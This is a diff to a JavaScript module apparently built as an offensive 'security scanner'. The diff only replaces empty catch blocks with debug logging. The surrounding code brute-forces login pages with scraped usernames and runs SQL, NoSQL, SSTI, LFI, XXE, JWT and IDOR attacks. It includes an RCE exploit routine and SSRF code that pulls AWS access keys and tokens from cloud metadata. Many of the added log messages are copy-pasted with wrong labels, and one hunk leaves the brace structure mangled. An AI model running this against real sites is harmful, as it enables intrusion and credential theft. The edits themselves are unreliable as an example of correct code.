@@ -1,4 +1,4 @@
-/**
+﻿/**
  * Security Scanner Module - Realtime Security Testing
  * by Wisnu Alfian Nur Ashar
  */
@@ -574,7 +574,9 @@ export async function discoverSubdomains(target, scanType) {
         if (resp.status < 500) {
           return { subdomain: `${sub}.${hostname}`, status: resp.status };
         }
-      } catch { }
+      } catch (error) {
+        console.debug(`[Security Scanner] Subdomain check failed for ${sub}.${hostname}: ${error.message}`);
+      }
       return null;
     });
 
@@ -648,7 +650,9 @@ export async function findAdminPages(target, scanType) {
         const title = (resp.data.match(/<title>([^<]*)<\/title>/i) || [])[1] || '';
         return { url, status: resp.status, title: title.slice(0, 100) };
       }
-    } catch { }
+    } catch (error) {
+      console.debug(`[Security Scanner] Path check failed for ${page}: ${error.message}`);
+    }
     return null;
   });
 
@@ -840,7 +844,9 @@ export async function massSQLInjection(target, scanType) {
         found = true;
         break;
       }
-    } catch { }
+    } catch (error) {
+      console.debug(`[Security Scanner] SQL injection test failed for payload: ${error.message}`);
+    }
   }
 
   if (found) {
@@ -1913,7 +1919,9 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
       cloudflareDetected = true;
       yield { type: 'cloudflare_detected', message: '⚠️ Cloudflare challenge blocking requests — cannot reach origin server' };
     }
-  } catch {}
+  } catch (error) {
+    console.debug(`[Security Scanner] Cloudflare detection failed: ${error.message}`);
+  }
 
   // Phase 2.1: REAL BRUTE FORCE — find creds by any means
   if (options?.bruteforce) {
@@ -1956,7 +1964,9 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
             yield { type: 'payload_test', module: 'BRUTE-FORCE', payload: `Found login panel: ${subUrl}` };
           }
         }
-      } catch {}
+      } catch (error) {
+        console.debug(`[Security Scanner] Subdomain scan failed for ${sub}: ${error.message}`);
+      }
     }
 
     // 3) Build username list from scraped emails + common usernames
@@ -1988,7 +1998,9 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
         if (!loginIndicators.some(k => body.toLowerCase().includes(k))) continue;
         foundLoginPages.push(loginPath);
         formFound = true;
-      } catch {}
+      } catch (error) {
+        console.debug(`[Security Scanner] Login page discovery failed for ${loginPath}: ${error.message}`);
+      }
     }
 
     // Second pass: attack each found login page with full credential spraying
@@ -2033,9 +2045,13 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
                 if (resp.status === 429 || resp.status === 403) {
                   yield { type: 'payload_test', module: 'BRUTE-FORCE', payload: `⚠️ Rate limited (${resp.status}) at ${username}:${password}` };
                 }
-              } catch {}
+              } catch (error) {
+                console.debug(`[Security Scanner] Credential test failed for ${username}: ${error.message}`);
+              }
             }
-          } catch {}
+          } catch (error) {
+            console.debug(`[Security Scanner] Username attack failed for ${username}: ${error.message}`);
+          }
           if (confirmedVulnerabilities.some(v => v.type.includes('Brute Forced'))) break;
         }
       }
@@ -2075,10 +2091,10 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
                   yield { type: 'vulnerability_confirmed', vulnerability: confirmedVulnerabilities[confirmedVulnerabilities.length - 1] };
                   break;
                 }
-              } catch {}
+              } catch (error) { console.debug(`[Security Scanner] Subdomain credential test failed: ${error.message}`); }
             }
           }
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
       }
     }
 
@@ -2108,9 +2124,11 @@ export async function* deepAttackStream(target, scanType, options = {}, aiManage
               });
               yield { type: 'vulnerability_confirmed', vulnerability: confirmedVulnerabilities[confirmedVulnerabilities.length - 1] };
               break;
-            }
-          } catch {}
-        }
+}
+      } catch (error) {
+        console.debug(`[Security Scanner] Email scraping failed for ${page}: ${error.message}`);
+      }
+    }
         if (confirmedVulnerabilities.some(v => v.type.includes('Brute Forced'))) break;
       }
     }
@@ -2448,7 +2466,9 @@ async function performDNSEnumeration(hostname) {
           records.push({ type: ans.type === 1 ? 'A' : ans.type === 28 ? 'AAAA' : ans.type === 15 ? 'MX' : ans.type === 2 ? 'NS' : ans.type === 16 ? 'TXT' : ans.type === 5 ? 'CNAME' : ans.type === 6 ? 'SOA' : 'OTHER', name: ans.name, data: ans.data, ttl: ans.TTL });
         });
       }
-    } catch {}
+    } catch (error) {
+      console.debug(`[Security Scanner] DNS ${type} query failed: ${error.message}`);
+    }
   }
 
   // Subdomain enumeration via crt.sh
@@ -2469,7 +2489,9 @@ async function performDNSEnumeration(hostname) {
       });
       unique.forEach(s => subdomains.push(s));
     }
-  } catch {}
+  } catch (error) {
+    console.debug(`[Security Scanner] Subdomain enumeration failed: ${error.message}`);
+  }
 
   // Verify subdomains
   const verifiedSubs = [];
@@ -2477,7 +2499,9 @@ async function performDNSEnumeration(hostname) {
     try {
       const resp = await axios.get(`https://${sub}`, { timeout: 3000, validateStatus: () => true });
       return { subdomain: sub, status: resp.status, server: resp.headers['server'] || 'Unknown' };
-    } catch {}
+    } catch (error) {
+      console.debug(`[Security Scanner] Subdomain verification failed for ${sub}: ${error.message}`);
+    }
     return null;
   });
   const results = await Promise.allSettled(checkPromises);
@@ -2531,7 +2555,9 @@ async function fingerprintTechnologies(target) {
     Object.entries(secHeaders).forEach(([header, name]) => {
       if (headers[header]) techs.push({ name: `${name} Header`, version: 'Present', source: 'Security Header', confirmed: true });
     });
-  } catch {}
+  } catch (error) {
+    console.debug(`[Security Scanner] Technology detection failed: ${error.message}`);
+  }
 
   return { technologies: techs, url: target };
 }
@@ -2880,7 +2906,7 @@ async function performSSTIAttack(target, scanType) {
         try {
           const controlResp = await axios.get(controlUrl, { timeout: 5000, validateStatus: () => true });
           controlBody = typeof controlResp.data === 'string' ? controlResp.data : '';
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
 
         // TEST: request with payload (don't follow redirects — 3xx means param reflected in URL, not executed)
         const resp = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
@@ -2988,7 +3014,7 @@ async function performNoSQLIAttack(target, scanType) {
         try {
           const controlResp = await axios.get(`${target}?username=test&password=test`, { timeout: 5000, validateStatus: () => true });
           controlBody = (typeof controlResp.data === 'string' ? controlResp.data : '').toLowerCase();
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
 
         const successfulIndicators = ['welcome', 'dashboard', 'success', 'logged', 'token', 'profile', 'admin'];
         const inTest = successfulIndicators.some(ind => body.includes(ind));
@@ -3021,7 +3047,7 @@ async function performNoSQLIAttack(target, scanType) {
             timeout: 5000, validateStatus: () => true,
           });
           controlBody = (typeof controlResp.data === 'string' ? controlResp.data : '').toLowerCase();
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
         const inTest = body.includes('success') || body.includes('token') || body.includes('welcome');
         const inControl = controlBody.includes('success') || controlBody.includes('token') || controlBody.includes('welcome');
         if (inTest && !inControl) {
@@ -3048,7 +3074,7 @@ async function performNoSQLIAttack(target, scanType) {
         try {
           const controlResp = await axios.get(target, { timeout: 5000, validateStatus: () => true });
           controlBody = (typeof controlResp.data === 'string' ? controlResp.data : '').toLowerCase();
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
         const authIndicators = ['dashboard', 'welcome', 'profile', 'admin'];
         const inTest = authIndicators.some(ind => body.includes(ind) || decodedBody.includes(ind));
         const inControl = authIndicators.some(ind => controlBody.includes(ind));
@@ -3144,7 +3170,7 @@ async function performLFIAttack(target, scanType) {
                 const decoded = Buffer.from(b64[0], 'base64').toString('utf-8').slice(0, 200);
                 extra.push(`Decoded PHP source: ${decoded}`);
               }
-            } catch {}
+            } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
           }
 
           confirmed.push({
@@ -3290,7 +3316,7 @@ async function performJWTAttack(target, scanType) {
               recommendation: 'Selalu set "exp" claim untuk JWT token. Implementasi refresh token yang aman.',
             });
           }
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
       }
     }
   } catch {}
@@ -3616,7 +3642,7 @@ async function performXXEAttack(target, scanType) {
             if (b64Match) {
               try {
                 extra.push(`Decoded source: ${Buffer.from(b64Match[0], 'base64').toString('utf-8').slice(0, 300)}`);
-              } catch {}
+              } catch (error) { console.debug(`[Security Scanner] Subdomain credential test failed: ${error.message}`); }
             }
           }
 
@@ -3679,7 +3705,7 @@ async function performIDORCheck(target, scanType) {
           const url = `${baseUrl}?${param}=${val}`;
           const resp = await axios.get(url, { timeout: 3000, validateStatus: () => true });
           responses.push({ url, status: resp.status, size: resp.data.length, body: resp.data.slice(0, 200) });
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
       }
 
       if (responses.length >= 3) {
@@ -4123,7 +4149,7 @@ async function exploitRCE(target) {
             if (extracted.database) result.database = extracted.database;
             break;
           }
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
       }
       if (result.command) break;
     }
@@ -4179,9 +4205,9 @@ async function exploitSSRF(target) {
                       const parsed = JSON.parse(credResp.data);
                       result.credentials.push({ type: 'AWS Access Key', username: parsed.AccessKeyId || 'unknown', password: parsed.SecretAccessKey || '[key]', source: 'SSRF AWS Metadata' });
                       result.credentials.push({ type: 'AWS Token', username: 'SessionToken', password: (parsed.Token || '[token]').slice(0, 50), source: 'SSRF AWS Metadata' });
-                    } catch {}
+                    } catch (error) { console.debug(`[Security Scanner] Subdomain credential test failed: ${error.message}`); }
                   }
-                } catch {}
+                } catch (error) { console.debug(`[Security Scanner] Subdomain credential test failed: ${error.message}`); }
               }
             } else {
               result.cloudMetadata = { provider: 'AWS', metadata: body.slice(0, 1000) };
@@ -4364,10 +4390,10 @@ async function exploitAuthAccess(target) {
                 const emails = (dashResp.data || '').match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
                 if (emails) result.credentials.push({ type: 'User Email', username: emails[0], password: '[from admin panel]', source: 'Admin Dashboard' });
               }
-            } catch {}
+            } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
             break;
           }
-        } catch {}
+        } catch (error) { console.debug(`[Security Scanner] Subdomain login page attack failed: ${error.message}`); }
       }
     } catch {}
   }
